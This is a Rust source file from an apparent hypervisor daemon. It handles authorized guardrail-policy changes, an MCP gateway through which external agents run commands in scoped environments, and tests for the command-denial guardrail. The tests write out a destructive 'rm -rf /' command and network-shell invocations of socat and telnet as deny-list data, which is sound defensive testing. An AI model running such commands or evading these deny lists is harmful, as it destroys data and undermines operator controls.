    let audit = audit_policy_change(data_dir, principal_ref, &active.projection);
    let audited = audit["audited"].as_bool().unwrap_or(false);
    let mut payload = active.as_success();
    payload["audited"] = json!(audited);
    payload["audit_durability"] = audit;
    (StatusCode::OK, payload)
}

/// Everything canon's mutation order specifies AFTER `authorize`: deserialize → validate →
/// PERSIST (typed refusal on failure) → RELOAD (acknowledge the projection, never the candidate)
/// → AUDIT (whose failure is a durability gap on an ACTIVE policy, not a rollback).
///
/// Extracted so the whole chain is directly testable without standing up an authenticated
/// session, which is a different plane's contract; `set_global_guardrail_policy` keeps the
/// authorize step in front of it and is tested for exactly that ordering.
///
/// `principal_ref` is the SERVER-RESOLVED principal from that crossing, threaded through so the
/// audit record can name who authorized the change. It is a parameter rather than something read
/// back out of the body precisely so a request can never supply it.
fn apply_authorized_policy_mutation(
    data_dir: &str,
    principal_ref: &str,
    body: &[u8],
) -> (StatusCode, Value) {
    let submitted: Value = match serde_json::from_slice(body) {
        Ok(value) => value,
        Err(error) => {
            return bad_request(
                "guardrail_policy_request_malformed",
                format!("the request body is not valid JSON ({error})"),
            )
        }
    };
    let candidate = match validated_candidate_policy(&submitted) {
        Ok(candidate) => candidate,
        Err((code, message)) => return bad_request(code, message),
    };
    if let Err(failure) =
        durable_fs::persist_record_durable(data_dir, POLICY_FAMILY, POLICY_RECORD, &candidate)
    {
        return refusal_for_persist_failure(data_dir, &failure);
    }
    acknowledge_policy_from_reload(data_dir, principal_ref, &candidate)
}

/// The policy mutation, extracted from the Axum adapter so authorization ordering is directly
/// testable.
///
/// The body arrives as raw bytes rather than through Axum's `Json<Value>` extractor precisely so
/// that "authorize before deserialization" is TRUE rather than merely claimed: the extractor runs
/// before the handler body, so an unauthenticated caller's payload would already have been
/// deserialized by the process it is not entitled to talk to.
fn set_global_guardrail_policy(
    data_dir: &str,
    headers: &HeaderMap,
    body: &[u8],
) -> (StatusCode, Value) {
    // The authority plane owns who may make this crossing. Resolved server-side through the
    // existing organization-administrator path — never duplicated here, and never read out of
    // the request being decided. Refuse HERE, before any deserialization, write, audit, or
    // projection change: the policy plane must be byte-identical afterwards.
    let actor = match super::lifecycle_routes::require_authenticated_org_admin(data_dir, headers) {
        Ok(actor) => actor,
        Err((status, Json(payload))) => return (status, payload),
    };
    // The actor is PRESERVED, not discarded: the audit record must name who authorized the
    // change. An admitted crossing that cannot produce a principal ref fails BEFORE the mutation
    // rather than writing an unattributable policy change.
    let Some(principal_ref) = actor
        .get("principal_ref")
        .and_then(Value::as_str)
        .filter(|reference| !reference.is_empty())
    else {
        return (
            StatusCode::INTERNAL_SERVER_ERROR,
            json!({ "ok": false, "error": {
                "code": "guardrail_policy_actor_unresolved",
                "message": "the authority crossing admitted this caller but produced no principal reference, so the policy change could not be attributed. Nothing was written and the active policy is unchanged.",
                "recovery": "this is a daemon identity-projection defect, not a caller error; report it. The policy plane is untouched."
            }}),
        );
    };
    apply_authorized_policy_mutation(data_dir, principal_ref, body)
}

/// POST /v1/hypervisor/guardrails — set the global policy. Organization-administrator authority
/// is resolved BEFORE the body is deserialized; success is projected from the reloaded durable
/// record and never from the submitted candidate.
pub(crate) async fn handle_guardrails_set(
    State(st): State<Arc<DaemonState>>,
    headers: HeaderMap,
    body: Bytes,
) -> (StatusCode, Json<Value>) {
    let (status, payload) = set_global_guardrail_policy(&st.data_dir, &headers, &body);
    (status, Json(payload))
}

// ============================ N. OBSERVABILITY / RECOVERY =========================================

/// GET /v1/hypervisor/environments/:id/logs?kind=session|tasks — read the persisted scoped logs.
pub(crate) async fn handle_env_logs(
    State(st): State<Arc<DaemonState>>,
    headers: HeaderMap,
    AxumPath(id): AxumPath<String>,
    Query(q): Query<std::collections::HashMap<String, String>>,
) -> Result<Json<Value>, AppError> {
    super::environment_routes::authorize_environment_owner(&st.data_dir, &headers, &id)?;
    let kind = q.get("kind").map(String::as_str).unwrap_or("session");
    let dir = Path::new(&st.data_dir).join("environments").join(safe(&id));
    match kind {
        "session" => {
            let text = std::fs::read_to_string(dir.join("session.log.jsonl")).unwrap_or_default();
            let lines: Vec<Value> = text
                .lines()
                .filter_map(|l| serde_json::from_str(l).ok())
                .collect();
            Ok(Json(
                json!({ "ok": true, "environment_id": id, "kind": "session", "entries": lines }),
            ))
        }
        "tasks" => {
            let mut logs = Vec::new();
            if let Ok(rd) = std::fs::read_dir(dir.join("task-logs")) {
                for e in rd.flatten() {
                    let name = e.file_name().to_string_lossy().into_owned();
                    let content = std::fs::read_to_string(e.path()).unwrap_or_default();
                    logs.push(json!({ "task": name, "bytes": content.len(), "tail": content.chars().rev().take(400).collect::<String>().chars().rev().collect::<String>() }));
                }
            }
            Ok(Json(
                json!({ "ok": true, "environment_id": id, "kind": "tasks", "logs": logs }),
            ))
        }
        other => Ok(Json(
            json!({ "ok": false, "reason": format!("unknown log kind '{other}'") }),
        )),
    }
}

/// GET /v1/hypervisor/operability/metrics — aggregate from real env + incident + audit truth.
pub(crate) async fn handle_operability_metrics(State(st): State<Arc<DaemonState>>) -> Json<Value> {
    // ENVIRONMENT_OWNER_CENSUS: aggregate_only — emits phase counts only; no environment
    // identifier, record, workspace coordinate, or workspace byte crosses the route.
    let envs = read_record_dir(&st.data_dir, "environments");
    let mut by_phase = serde_json::Map::new();
    for e in &envs {
        let phase = e["status"]["phase"]
            .as_str()
            .unwrap_or("unknown")
            .to_string();
        let n = by_phase.get(&phase).and_then(|v| v.as_u64()).unwrap_or(0) + 1;
        by_phase.insert(phase, json!(n));
    }
    let audit = read_record_dir(&st.data_dir, "operability-audit");
    let guardrail_denials = audit
        .iter()
        .filter(|a| a["kind"] == "guardrail_denied")
        .count();
    Json(json!({
        "schema_version": "ioi.hypervisor.operability-metrics.v1",
        "total_environments": envs.len(),
        "active_by_phase": Value::Object(by_phase),
        "incidents": read_record_dir(&st.data_dir, "incidents").len(),
        "recovery_attempts": read_record_dir(&st.data_dir, "recovery-attempts").len(),
        "snapshots": read_record_dir(&st.data_dir, "snapshots").len(),
        "guardrail_denials": guardrail_denials,
        "automation_executions": read_record_dir(&st.data_dir, "automation-executions").len(),
        "placements": read_record_dir(&st.data_dir, "placement-decisions").len(),
        "at": iso_now()
    }))
}

/// GET /v1/hypervisor/operability/incidents/:id — reconstruct an incident from receipts + attempts +
/// audit (the cross-source reconstruction the recovery done-bar requires).
pub(crate) async fn handle_incident_reconstruct(
    State(st): State<Arc<DaemonState>>,
    AxumPath(id): AxumPath<String>,
) -> Json<Value> {
    let incident = read_record_dir(&st.data_dir, "incidents")
        .into_iter()
        .find(|i| {
            i["incident_id"].as_str() == Some(id.as_str())
                || i["incident_ref"].as_str() == Some(id.as_str())
        });
    let Some(incident) = incident else {
        return Json(json!({ "ok": false, "reason": "incident not found" }));
    };
    let attempts: Vec<Value> = read_record_dir(&st.data_dir, "recovery-attempts")
        .into_iter()
        .filter(|a| a["incident_ref"].as_str() == Some(id.as_str()))
        .collect();
    let receipts: Vec<Value> = read_record_dir(&st.data_dir, "receipts")
        .into_iter()
        .filter(|r| {
            r["details"]["incident_ref"].as_str() == Some(id.as_str())
                || r["kind"] == "environment_recovery"
        })
        .collect();
    Json(json!({
        "ok": true, "reconstructed": true, "incident": incident,
        "recovery_attempts": attempts, "receipts": receipts,
        "chain_complete": !attempts.is_empty() && !receipts.is_empty()
    }))
}

// ============================ O. HYPERVISOR MCP GATEWAY ===========================================

/// Headers that decide the auth POSTURE and the resolved PRINCIPAL on an inbound
/// request. They must survive the loopback hop or the second request is evaluated
/// under a weaker posture than the caller's.
///
/// `auth_gate` enforces when `auth_enforced()` is true, and in the default `auto`
/// mode that is `daemon_exposed() || request_exposed(headers)`. A loopback call
/// carrying no headers has a 127.0.0.1 Host and no `x-forwarded-*`, so
/// `request_exposed` is false: an externally forwarded, authenticated MCP request
/// would have executed its EFFECT unauthenticated, under `local_development`
/// posture, with no principal bound to the receipt. Native callers hitting the
/// same route directly are enforced. That divergence is exactly what the
/// native/MCP parity rule forbids.
const FORWARDED_AUTH_HEADERS: &[&str] = &[
    "authorization",
    "cookie",
    "x-forwarded-host",
    "x-forwarded-for",
    "x-ioi-forwarded",
];

async fn call(
    base: &str,
    method: &str,
    path: &str,
    body: Option<Value>,
    inbound: &axum::http::HeaderMap,
) -> Result<Value, String> {
    let client = reqwest::Client::new();
    let url = format!("{base}{path}");
    let mut req = if method == "POST" {
        client.post(&url)
    } else {
        client.get(&url)
    };
    for name in FORWARDED_AUTH_HEADERS {
        if let Some(value) = inbound.get(*name).and_then(|v| v.to_str().ok()) {
            req = req.header(*name, value);
        }
    }
    if let Some(b) = body {
        req = req.json(&b);
    }
    let r = req.send().await.map_err(|e| e.to_string())?;
    let t = r.text().await.map_err(|e| e.to_string())?;
    serde_json::from_str(&t).map_err(|e| format!("{e}: {t}"))
}

fn gateway_tools() -> Value {
    json!([
        { "name": "hv_create_env", "scope": "environment.create", "description": "Create + start a scoped environment", "input": { "project_id": "string?", "class": "string?" } },
        { "name": "hv_run_task", "scope": "environment.exec", "description": "Run a guardrail-enforced command in an env", "input": { "environment_id": "string", "command": "string" } },
        { "name": "hv_inspect_env", "scope": "environment.read", "description": "Inspect an env (phase, components, ports)", "input": { "environment_id": "string" } },
        { "name": "hv_cleanup_env", "scope": "environment.delete", "description": "Delete an env (terminal)", "input": { "environment_id": "string" } }
    ])
}

/// GET /v1/hypervisor/mcp-gateway/tools — the scoped external-agent tool surface.
pub(crate) async fn handle_mcp_gateway_tools(State(_st): State<Arc<DaemonState>>) -> Json<Value> {
    Json(json!({ "schema_version": "ioi.hypervisor.mcp-gateway.v1", "tools": gateway_tools() }))
}

/// POST /v1/hypervisor/mcp-gateway/tools/:tool — invoke a scoped tool (same daemon routes as the app).
pub(crate) async fn handle_mcp_gateway_invoke(
    State(st): State<Arc<DaemonState>>,
    AxumPath(tool): AxumPath<String>,
    headers: axum::http::HeaderMap,
    Json(body): Json<Value>,
) -> Result<Json<Value>, AppError> {
    let base = st.base_url.clone();
    let inbound = headers;
    let gw = |v: Value| {
        Ok(Json(
            json!({ "ok": true, "tool": tool.clone(), "result": v }),
        ))
    };
    match tool.as_str() {
        "hv_create_env" => {
            let spec = json!({ "spec": { "environment_class_id": body.get("class").and_then(|v| v.as_str()).unwrap_or("local-workspace-v0"), "project_id": body.get("project_id").and_then(|v| v.as_str()).unwrap_or("mcp-gateway") } });
            let created = call(
                &base,
                "POST",
                "/v1/hypervisor/environments",
                Some(spec),
                &inbound,
            )
            .await
            .map_err(|e| AppError(axum::http::StatusCode::BAD_GATEWAY, e))?;
            let eid = created["environment"]["id"]
                .as_str()
                .unwrap_or_default()
                .to_string();
            let _ = call(
                &base,
                "POST",
                &format!("/v1/hypervisor/environments/{eid}/start"),
                None,
                &inbound,
            )
            .await;
            gw(json!({ "environment_id": eid }))
        }
        "hv_run_task" => {
            let eid = body
                .get("environment_id")
                .and_then(|v| v.as_str())
                .unwrap_or_default();
            let cmd = body
                .get("command")
                .and_then(|v| v.as_str())
                .unwrap_or_default();
            // routes through the SAME /exec the app uses → guardrails apply identically.
            let r = call(
                &base,
                "POST",
                "/v1/hypervisor/exec",
                Some(json!({ "environment_id": eid, "command": cmd })),
                &inbound,
            )
            .await
            .map_err(|e| AppError(axum::http::StatusCode::BAD_GATEWAY, e))?;
            gw(r)
        }
        "hv_inspect_env" => {
            let eid = body
                .get("environment_id")
                .and_then(|v| v.as_str())
                .unwrap_or_default();
            let env = call(
                &base,
                "GET",
                &format!("/v1/hypervisor/environments/{eid}"),
                None,
                &inbound,
            )
            .await
            .map_err(|e| AppError(axum::http::StatusCode::BAD_GATEWAY, e))?;
            let s = &env["environment"]["status"];
            gw(
                json!({ "environment_id": eid, "phase": s["phase"], "readiness": s["readiness"], "components": s["components"], "ports": s["ports"] }),
            )
        }
        "hv_cleanup_env" => {
            let eid = body
                .get("environment_id")
                .and_then(|v| v.as_str())
                .unwrap_or_default();
            let r = call(
                &base,
                "POST",
                &format!("/v1/hypervisor/environments/{eid}/delete"),
                None,
                &inbound,
            )
            .await
            .map_err(|e| AppError(axum::http::StatusCode::BAD_GATEWAY, e))?;
            gw(
                json!({ "environment_id": eid, "deleted": r["environment"]["status"]["deleted"].as_bool().unwrap_or(false) || r["status"].as_str() == Some("deleted") }),
            )
        }
        other => Ok(Json(
            json!({ "ok": false, "reason": format!("unknown gateway tool '{other}'") }),
        )),
    }
}

// ============================ /v1 CAPABILITY INDEX (W0.6) ========================================

/// The central flat router source, embedded at compile time. The daemon registers every route in
/// this ONE file (`hypervisor-daemon.rs`), so parsing its `.route("...", ...)` registrations
/// yields the same route table the built binary serves — the index is mechanically derived and
/// cannot silently drift from the source it was compiled with. (A route registered outside the
/// central router file would not appear here; today none are on the public listener — the only
/// out-of-file registrations are the per-session preview sub-server in lifecycle_routes.)
const ROUTER_SOURCE: &str = include_str!("../hypervisor-daemon.rs");

pub(crate) struct ParsedRoute {
    pub(crate) path: String,
    pub(crate) methods: Vec<String>,
}

/// Parse every `.route("<path>", <handlers>)` registration out of the router source: the string
/// literal is the path; HTTP methods are the `get(`/`post(`/`put(`/`patch(`/`delete(`/`any(`
/// tokens inside the balanced handler expression. Parsed once, cached for the process lifetime.
pub(crate) fn parsed_router_routes() -> &'static Vec<ParsedRoute> {
    static ROUTES: std::sync::OnceLock<Vec<ParsedRoute>> = std::sync::OnceLock::new();
    ROUTES.get_or_init(|| {
        let mut routes: Vec<ParsedRoute> = Vec::new();
        let mut merged: std::collections::BTreeMap<String, std::collections::BTreeSet<String>> =
            std::collections::BTreeMap::new();
        let source = ROUTER_SOURCE;
        let mut cursor = 0usize;
        while let Some(found) = source[cursor..].find(".route(") {
            let open = cursor + found + ".route(".len();
            cursor = open;
            let rest = &source[open..];
            // Path literal: the first "-delimited string after the opening paren.
            let Some(quote_start) = rest.find('"') else {
                continue;
            };
            let Some(quote_len) = rest[quote_start + 1..].find('"') else {
                continue;
            };
            let path = &rest[quote_start + 1..quote_start + 1 + quote_len];
            if !path.starts_with('/') {
                continue;
            }
            // Balanced-paren scan for the handler expression of THIS .route(...) call.
            let mut depth = 1i32;
            let mut end = quote_start + 1 + quote_len + 1;
            let bytes = rest.as_bytes();
            while end < bytes.len() && depth > 0 {
                match bytes[end] {
                    b'(' => depth += 1,
                    b')' => depth -= 1,
                    _ => {}
                }
                end += 1;
            }
            let handlers = &rest[quote_start + 1 + quote_len + 1..end.saturating_sub(1)];
            let mut methods = std::collections::BTreeSet::new();
            for (token, verb) in [
                ("get(", "GET"),
                ("post(", "POST"),
                ("put(", "PUT"),
                ("patch(", "PATCH"),
                ("delete(", "DELETE"),
                ("any(", "ANY"),
            ] {
                let mut scan = 0usize;
                while let Some(hit) = handlers[scan..].find(token) {
                    let at = scan + hit;
                    let boundary_ok = at == 0
                        || (!handlers.as_bytes()[at - 1].is_ascii_alphanumeric()
                            && handlers.as_bytes()[at - 1] != b'_');
                    if boundary_ok {
                        methods.insert(verb.to_string());
                    }
                    scan = at + token.len();
                }
            }
            merged.entry(path.to_string()).or_default().extend(methods);
        }
        for (path, methods) in merged {
            routes.push(ParsedRoute {
                path,
                methods: methods.into_iter().collect(),
            });
        }
        routes
    })
}

/// GET /v1 — the honest capability index of the daemon's route families (W0.6). Mechanically
/// derived from the central router source embedded at compile time — never a hand-list that can
/// drift silently. Routes group by family prefix; retired spellings that answer with typed 410
/// refusals are labeled.
pub(crate) async fn handle_v1_index() -> Json<Value> {
    let routes = parsed_router_routes();
    let family_of = |path: &str| -> String {
        let segments: Vec<&str> = path.split('/').filter(|s| !s.is_empty()).collect();
        match segments.as_slice() {
            ["v1", "hypervisor", "odk", third, ..] => format!("/v1/hypervisor/odk/{third}"),
            ["v1", "hypervisor", second, ..] => format!("/v1/hypervisor/{second}"),
            ["v1", second, ..] => format!("/v1/{second}"),
            [first, ..] => format!("/{first}"),
            [] => "/".to_string(),
        }
    };
    let mut families: std::collections::BTreeMap<String, Vec<Value>> =
        std::collections::BTreeMap::new();
    let retired = ["/sessions", "/missions", "/__ioi/*path"];
    for route in routes.iter() {
        let mut row = json!({ "path": route.path, "methods": route.methods });
        if retired.contains(&route.path.as_str()) {
            row["retired"] = json!(true);
            row["note"] = json!("answers with the typed route-retirement refusal (410)");
        }
        families
            .entry(family_of(&route.path))
            .or_default()
            .push(row);
    }
    let total_routes = routes.len();
    let families_json: Vec<Value> = families
        .into_iter()
        .map(|(family, rows)| json!({ "family": family, "routes": rows.len(), "paths": rows }))
        .collect();
    Json(json!({
        "schema_version": "ioi.hypervisor.v1-index.v1",
        "total_routes": total_routes,
        "families": families_json,
        "derivation": {
            "kind": "mechanical",
            "source": "central router source (hypervisor-daemon.rs) embedded at compile time; .route() registrations parsed at first request",
            "drift_note": "the index derives from the same source the binary was compiled from; routes registered outside the central router file would not appear (today: none on the public listener)"
        },
        "runtimeTruthSource": "daemon-runtime"
    }))
}

#[cfg(test)]
mod command_execution_guardrail_tests {
    use super::*;

    // Every fault below is DETERMINISTIC, UID-INDEPENDENT and PROCESS-LOCAL. No chmod: root
    // bypasses mode-bit denial, so a permission-based fault would pass vacuously whenever the
    // suite runs as root. No env var and no cwd change, so nothing here can race the rest of the
    // suite — which also rules out durable_fs's `IOI_TEST_FORCE_DIRSYNC_UNCONFIRMED` seam, a
    // process-global. `RenamedDurabilityUnconfirmed` is therefore covered by constructing the
    // variant and asserting the HANDLER MAPPING, relying on durable_fs's own tests for the
    // syscall behaviour that produces it.
    //
    // Neither "guardrail-policies" nor "operability-audit" is in PROMOTED_DOMAINS or
    // REQUIRED_ADMISSION_DOMAINS, so both take the daemon-file path inside
    // `persist_record_durable`: it can fail at create_dir_all, at the temp sibling, or at the
    // rename. A promoted family would admit through the substrate engine and its failure points
    // would differ.

    /// Stands in for the principal `require_authenticated_org_admin` resolves. Passed as an
    /// argument precisely because production reads it from the authority crossing and never from
    /// the request body.
    const ACTOR: &str = "principal://local/org-admin-1";

    fn temp() -> tempfile::TempDir {
        tempfile::tempdir().unwrap()
    }

    fn dir_of(directory: &tempfile::TempDir) -> &str {
        directory.path().to_str().unwrap()
    }

    fn write_legacy(directory: &tempfile::TempDir, bytes: &[u8]) {
        std::fs::write(directory.path().join(LEGACY_POLICY_FILE), bytes).unwrap();
    }

    fn seed_durable(data_dir: &str, record: &Value) {
        durable_fs::persist_record_durable(data_dir, POLICY_FAMILY, POLICY_RECORD, record).unwrap();
    }

    /// The environment record shape the enforcement point actually passes in.
    fn env_with(guardrails: Value) -> Value {
        json!({ "id": "env_1", "spec": { "guardrails": guardrails } })
    }

    fn no_local_env() -> Value {
        json!({ "id": "env_1", "spec": {} })
    }

    fn audit_records(data_dir: &str) -> Vec<Value> {
        read_record_dir(data_dir, "operability-audit")
    }

    fn decide(data_dir: &str, env: &Value, command: &str) -> GuardrailDecision {
        guardrail_check(data_dir, env, command)
    }

    fn is_indeterminate(decision: &GuardrailDecision) -> bool {
        matches!(decision, GuardrailDecision::Indeterminate(_))
    }

    fn refusal_value(decision: &GuardrailDecision) -> Value {
        match decision {
            GuardrailDecision::Indeterminate(value) | GuardrailDecision::Denied(value) => {
                value.clone()
            }
            GuardrailDecision::Allowed => Value::Null,
        }
    }

    // ---------------------------------------------------------------- 1. ABSENCE

    #[test]
    fn missing_both_stores_selects_the_built_in_default_and_names_it_as_absence() {
        let directory = temp();
        let data_dir = dir_of(&directory);

        let (status, body) = guardrail_policy_projection(data_dir);

        assert_eq!(status, StatusCode::OK);
        assert_eq!(body["ok"], json!(true));
        assert_eq!(body["source"], json!("built_in_default"));
        assert!(
            body["posture"].as_str().unwrap().contains("ABSENCE"),
            "absence must be legible AS absence, got {}",
            body["posture"]
        );
        assert_eq!(
            body["policy"]["deny_commands"],
            json!(DEFAULT_DENY_COMMANDS)
        );
        assert_eq!(
            body["normalized_absent_denial_keys"],
            json!(Vec::<String>::new())
        );
        // The default is genuinely enforcing, not merely reported.
        assert!(matches!(
            decide(data_dir, &no_local_env(), "rm -rf /"),
            GuardrailDecision::Denied(_)
        ));
        assert!(matches!(
            decide(data_dir, &no_local_env(), "ls -la"),
            GuardrailDecision::Allowed
        ));
    }

    // ------------------------------------------------- 2. INDETERMINATE, NOT DEFAULT

    /// The inversion PO-11 demands: a corrupt policy file and NO policy file are different states
    /// and must not present identically. Substituting the default here would answer "what did the
    /// operator require?" with a guess.
    #[test]
    fn a_malformed_legacy_file_is_indeterminate_and_denies_rather_than_defaulting() {
        let directory = temp();
        let data_dir = dir_of(&directory);
        write_legacy(&directory, b"{ this is not json");

        let (status, body) = guardrail_policy_projection(data_dir);
        assert_eq!(status, StatusCode::SERVICE_UNAVAILABLE);
        assert_eq!(body["ok"], json!(false));
        assert_eq!(
            body["error"]["code"],
            json!("guardrail_policy_indeterminate")
        );
        assert_eq!(body["error"]["store"], json!("legacy_file"));
        assert!(!body["error"]["recovery"].as_str().unwrap().is_empty());

        // A command the BUILT-IN DEFAULT would have allowed is refused, which is the whole point:
        // the default was not silently substituted.
        let decision = decide(data_dir, &no_local_env(), "ls -la");
        assert!(is_indeterminate(&decision));
        let refusal = refusal_value(&decision);
        assert_eq!(refusal["denied"], json!(true));
        assert_eq!(refusal["policy_indeterminate"], json!(true));
        // No policy rule was evaluated, so none may be named.
        assert!(refusal.get("rule").is_none());
        assert!(refusal.get("matched").is_none());
    }

    #[test]
    fn a_malformed_durable_record_is_indeterminate_and_never_falls_back_to_legacy_or_default() {
        let directory = temp();
        let data_dir = dir_of(&directory);
        // A perfectly good legacy policy sits underneath — it must NOT be reactivated by a
        // corrupt durable store, or corruption would silently restore a superseded policy.
        write_legacy(
            &directory,
            br#"{"deny_commands":["legacy-only"],"deny_executables":[]}"#,
        );
        seed_durable(data_dir, &json!({ "deny_commands": "not-an-array" }));

        let (status, body) = guardrail_policy_projection(data_dir);
        assert_eq!(status, StatusCode::SERVICE_UNAVAILABLE);
        assert_eq!(body["error"]["store"], json!("durable_record"));

        assert!(is_indeterminate(&decide(
            data_dir,
            &no_local_env(),
            "ls -la"
        )));
        // Neither the legacy policy nor the default is enforcing.
        assert!(is_indeterminate(&decide(
            data_dir,
            &no_local_env(),
            "legacy-only"
        )));
    }

    #[test]
    fn a_durable_record_missing_a_denial_key_is_malformed_not_a_legacy_style_absence() {
        let directory = temp();
        let data_dir = dir_of(&directory);
        seed_durable(data_dir, &json!({ "deny_commands": ["boom"] }));

        let (status, body) = guardrail_policy_projection(data_dir);
        assert_eq!(status, StatusCode::SERVICE_UNAVAILABLE);
        assert_eq!(body["error"]["store"], json!("durable_record"));
        assert!(body["error"]["message"]
            .as_str()
            .unwrap()
            .contains("deny_executables"));
    }

    #[test]
    fn a_non_regular_legacy_occupant_is_indeterminate_not_absent() {
        let directory = temp();
        let data_dir = dir_of(&directory);
        // A DIRECTORY where the legacy file belongs: `read_slot_strict` opens it and refuses on
        // the non-regular file type. Only a true ENOENT is absence.
        std::fs::create_dir_all(directory.path().join(LEGACY_POLICY_FILE)).unwrap();

        assert_eq!(
            guardrail_policy_projection(data_dir).0,
            StatusCode::SERVICE_UNAVAILABLE
        );
        assert!(is_indeterminate(&decide(data_dir, &no_local_env(), "ls")));
    }

    /// A symlinked legacy POLICY FILE is indeterminate by design — the strict terminal read
    /// refuses to follow it — and the refusal names the migration rather than leaving an operator
    /// guessing.
    #[test]
    fn a_symlinked_legacy_file_is_indeterminate_and_the_refusal_names_the_migration() {
        let directory = temp();
        let data_dir = dir_of(&directory);
        let real = directory.path().join("mounted-policy.json");
        std::fs::write(&real, br#"{"deny_commands":[],"deny_executables":[]}"#).unwrap();
        std::os::unix::fs::symlink(&real, directory.path().join(LEGACY_POLICY_FILE)).unwrap();

        let (status, body) = guardrail_policy_projection(data_dir);
        assert_eq!(status, StatusCode::SERVICE_UNAVAILABLE);
        let recovery = body["error"]["recovery"].as_str().unwrap();
        assert!(
            recovery.contains("SYMLINKED") && recovery.contains("MIGRATION"),
            "a symlink-mounted deployment must be told how to recover, got: {recovery}"
        );
        assert!(is_indeterminate(&decide(data_dir, &no_local_env(), "ls")));
    }

    /// A SYMLINKED DATA DIRECTORY must still resolve. `O_NOFOLLOW` constrains only the terminal
    /// path component, so pinning `data_dir` itself rejected a symlinked data directory while the
    /// durable lane — which opens `<data_dir>/guardrail-policies`, where `data_dir` is
    /// non-terminal — followed it happily. That asymmetry bought no containment (whoever can
    /// replace `data_dir` equally controls `data_dir/guardrail-policies`) and denied all command
    /// execution for containers and atomic-swap release directories, i.e. exactly the population
    /// still on the legacy store. Both lanes now resolve the parent path identically.
    #[test]
    fn a_symlinked_data_directory_resolves_on_both_the_legacy_and_durable_lanes() {
        let directory = temp();
        let real = directory.path().join("real-data-dir");
        std::fs::create_dir_all(&real).unwrap();
        std::fs::write(
            real.join(LEGACY_POLICY_FILE),
            br#"{"deny_commands":["operator-set"],"deny_executables":[]}"#,
        )
        .unwrap();
        let linked = directory.path().join("linked-data-dir");
        std::os::unix::fs::symlink(&real, &linked).unwrap();
        let data_dir = linked.to_str().unwrap();

        // The LEGACY lane resolves through the symlinked data directory...
        let (status, body) = guardrail_policy_projection(data_dir);
        assert_eq!(status, StatusCode::OK, "got {body}");
        assert_eq!(body["source"], json!("legacy_operator_file"));
        assert_eq!(body["policy"]["deny_commands"], json!(["operator-set"]));
        assert!(matches!(
            decide(data_dir, &no_local_env(), "operator-set"),
            GuardrailDecision::Denied(_)
        ));
        assert!(matches!(
            decide(data_dir, &no_local_env(), "echo hi"),
            GuardrailDecision::Allowed
        ));

        // ...and so does the DURABLE lane, through the same symlink — the two agree.
        let (status, _) = apply_authorized_policy_mutation(
            data_dir,
            ACTOR,
            br#"{"deny_commands":["durable-set"],"deny_executables":[]}"#,
        );
        assert_eq!(status, StatusCode::OK);
        let (status, body) = guardrail_policy_projection(data_dir);
        assert_eq!(status, StatusCode::OK);
        assert_eq!(body["source"], json!("durable_operator_record"));

        // The terminal no-follow guarantee is UNCHANGED: a symlinked policy file inside a
        // symlinked data directory is still indeterminate.
        std::fs::remove_dir_all(real.join(POLICY_FAMILY)).unwrap();
        std::fs::remove_file(real.join(LEGACY_POLICY_FILE)).unwrap();
        std::fs::write(real.join("mounted.json"), br#"{"deny_commands":[]}"#).unwrap();
        std::os::unix::fs::symlink(real.join("mounted.json"), real.join(LEGACY_POLICY_FILE))
            .unwrap();
        assert_eq!(
            guardrail_policy_projection(data_dir).0,
            StatusCode::SERVICE_UNAVAILABLE
        );
    }

    // ------------------------------------------- 3. ABSENT GLOBAL KEY + LOCAL ADDITIONS

    /// PO-10 monotonicity: a composition step that silently DROPS an environment's additions
    /// because a global key was absent is a widening defect. The previous merge only applied when
    /// the active policy ALREADY carried the matching key.
    #[test]
    fn an_absent_global_denial_key_still_admits_environment_local_additions() {
        let directory = temp();
        let data_dir = dir_of(&directory);
        // A legacy operator policy with NO deny_commands key at all.
        write_legacy(&directory, br#"{"deny_executables":["telnet"]}"#);
        let env = env_with(json!({ "deny_commands": ["launch-the-missiles"] }));

        let (status, body) = guardrail_policy_projection(data_dir);
        assert_eq!(status, StatusCode::OK);
        assert_eq!(body["source"], json!("legacy_operator_file"));
        // GET IDENTIFIES the normalized missing key instead of silently re-adding the built-in
        // list underneath an authorized change.
        assert_eq!(
            body["normalized_absent_denial_keys"],
            json!(["deny_commands"])
        );
        assert!(body["policy"].get("deny_commands").is_none());

        // The addition LANDS.
        match decide(data_dir, &env, "launch-the-missiles --now") {
            GuardrailDecision::Denied(denial) => {
                assert_eq!(denial["rule"], json!("deny_command"));
                assert_eq!(denial["matched"], json!("launch-the-missiles"));
            }
            other => panic!(
                "the local addition was dropped: {:?}",
                refusal_value(&other)
            ),
        }
        // ...and the built-in default was NOT re-added underneath the operator's policy.
        assert!(matches!(
            decide(data_dir, &env, "rm -rf /"),
            GuardrailDecision::Allowed
        ));
        // The operator's own executable denial still enforces.
        assert!(matches!(
            decide(data_dir, &env, "telnet host 23"),
            GuardrailDecision::Denied(_)
        ));
    }

    /// The MIRROR of the case above: `deny_commands` present, `deny_executables` absent. Both
    /// directions matter because the absent key is normalized independently.
    #[test]
    fn the_mirror_absent_global_key_also_admits_local_additions() {
        let directory = temp();
        let data_dir = dir_of(&directory);
        write_legacy(&directory, br#"{"deny_commands":["operator-set"]}"#);
        let env = env_with(json!({ "deny_executables": ["socat"] }));

        let (status, body) = guardrail_policy_projection(data_dir);
        assert_eq!(status, StatusCode::OK);
        assert_eq!(
            body["normalized_absent_denial_keys"],
            json!(["deny_executables"])
        );
        assert!(matches!(
            decide(data_dir, &env, "socat - TCP:host:1"),
            GuardrailDecision::Denied(_)
        ));
        assert!(matches!(
            decide(data_dir, &env, "operator-set"),
            GuardrailDecision::Denied(_)
        ));
        // The built-in executable list is not re-added underneath the operator's policy.
        assert!(matches!(
            decide(data_dir, &env, "telnet host 23"),
            GuardrailDecision::Allowed
        ));
    }

    #[test]
    fn a_missing_local_key_means_no_additions_and_never_drops_the_other_key() {
        let directory = temp();
        let data_dir = dir_of(&directory);
        let env = env_with(json!({ "deny_executables": ["socat"] }));

        assert!(matches!(
            decide(data_dir, &env, "socat - TCP:host:1"),
            GuardrailDecision::Denied(_)
        ));
        assert!(matches!(
            decide(data_dir, &env, "echo hi"),
            GuardrailDecision::Allowed
        ));
    }

    #[test]
    fn local_additions_are_unique_and_never_subtract_a_global_denial() {
        let directory = temp();
        let data_dir = dir_of(&directory);
        // Re-declaring an already-denied pattern is a no-op, not a removal.
        let env = env_with(json!({ "deny_commands": ["rm -rf /", "rm -rf /", "extra"] }));

        assert!(matches!(
            decide(data_dir, &env, "rm -rf /"),
            GuardrailDecision::Denied(_)
        ));
        assert!(matches!(
            decide(data_dir, &env, "extra"),
            GuardrailDecision::Denied(_)
        ));
    }

    #[test]
